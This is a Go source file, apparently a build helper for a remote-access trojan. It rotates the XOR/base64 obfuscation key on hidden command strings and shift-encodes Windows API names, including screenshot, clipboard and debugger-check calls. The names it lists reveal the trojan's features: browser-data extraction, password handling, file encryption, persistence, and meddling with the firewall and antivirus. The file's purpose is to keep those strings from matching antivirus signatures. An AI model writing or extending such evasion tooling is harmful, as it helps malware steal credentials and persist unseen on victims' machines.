// genobf: decode current obf* hex literals with oldKey, emit new hex for newKey (lastfinalversion2 rotation).
// Run: go run ./tools/genobf.go
package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
)

const oldKey = "k7mQ2pL9nX4wZ1vB8cH5jR0sT6yU3e"
const newKey = "p9nK4vR2xL8wQ1mZ6tY0hC7jB3sU5eA"
const newShift = 11

func xorEncode(data []byte, key string) []byte {
	k := []byte(key)
	for i := range data {
		data[i] ^= k[i%len(k)]
	}
	return data
}

func obfuscate(input, key string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(input))
	xored := xorEncode([]byte(b64), key)
	return hex.EncodeToString(xored)
}

func deobfuscate(hexStr, key string) string {
	xoredBytes, _ := hex.DecodeString(hexStr)
	b64Bytes := xorEncode(xoredBytes, key)
	b64Str := string(b64Bytes)
	decoded, _ := base64.StdEncoding.DecodeString(b64Str)
	return string(decoded)
}

func shiftEncrypt(text string, shift int) string {
	result := make([]byte, len(text))
	for i, char := range text {
		result[i] = byte((int(char) + shift) % 256)
	}
	return string(result)
}

func main() {
	hexes := []string{
		"3a6f2f2666370a080c357a1800693f37623b2059", "3d6f2f3a6b281e553a0f72020366122e5b0a7d590f15654e", "3e04012b56371a4d3d1f62043976203b740e1e0130030d4e", "3e053b28561d2053340e7e46385c432e5b0a7d590f15654e",
		"0f703b2b56317104", "31703b3856272f04", "0f6f2f2250420a522719094a", "31705462501d344f370f6510", "0a05012250317104",
		"0804012b532779540c2f094a", "087f27276b421a430d6a620d", "08053b28561d20533400794a", "095a3b61564275400f2f094a",
		"0805232868271a4c0d6a5c013e704b7f", "085a3b3f532802090d365f4a", "08043f39511e1e080d19094a", "315a0128682828510c1f434a",
		"32605861532816490d36620d", "08053b6151370a430d21754a", "31053b6151370a430d2f094a", "3160583b511e204e0a1b754a",
		"31703b3b511e204e0a1b754a", "0970012b56371a4c376b7e423979242e62227508", "316f0561511d0a530a1f7e0e38021238623b0108",
		"316f0561511d0a530a1f7e0e38021238623b025a0b0562180e614d68", "32592727564302550d36761f3e761e38", "08053b6151370a430d21754a",
		"31053b6151370a430d2f094a", "3160583b511e204e0a1b754a", "097f206c", "31700128", "087f093a", "0866506c", "32053c36",
	}
	names := []string{"obfApp0", "obfApp1", "obfApp2", "obfApp3", "obfTest", "obfDebug", "obfUpload", "obfDownload", "obfKill",
		"obfSysinfo", "obfProcesses", "obfServices", "obfNetwork", "obfScreenshot", "obfRegistry", "obfStartup", "obfFirewall",
		"obfAntivirus", "obfSetpass", "obfGetpass", "obfEncrypt", "obfDecrypt", "obfListencrypted", "obfExtractbrowser",
		"obfExtractbrowserhidden", "obfBrowserpaths", "obfSetpersistence", "obfRemovepersistence", "obfCheckpersistence",
		"obfLs", "obfDir", "obfPwd", "obfQ", "obfCd"}
	for i, h := range hexes {
		pt := deobfuscate(h, oldKey)
		fmt.Printf("%s\t%s\n", names[i], obfuscate(pt, newKey))
	}
	fmt.Println("--- shift strings (newShift) ---")
	dlls := []string{"user32.dll", "gdi32.dll", "kernel32.dll", "GetConsoleWindow", "ShowWindow", "GetSystemMetrics", "GetDC",
		"CreateCompatibleDC", "CreateCompatibleBitmap", "SelectObject", "BitBlt", "DeleteObject", "DeleteDC", "ReleaseDC", "OpenClipboard",
		"EmptyClipboard", "SetClipboardData", "CloseClipboard", "IsDebuggerPresent"}
	for _, d := range dlls {
		fmt.Printf("%q\n", shiftEncrypt(d, newShift))
	}
}
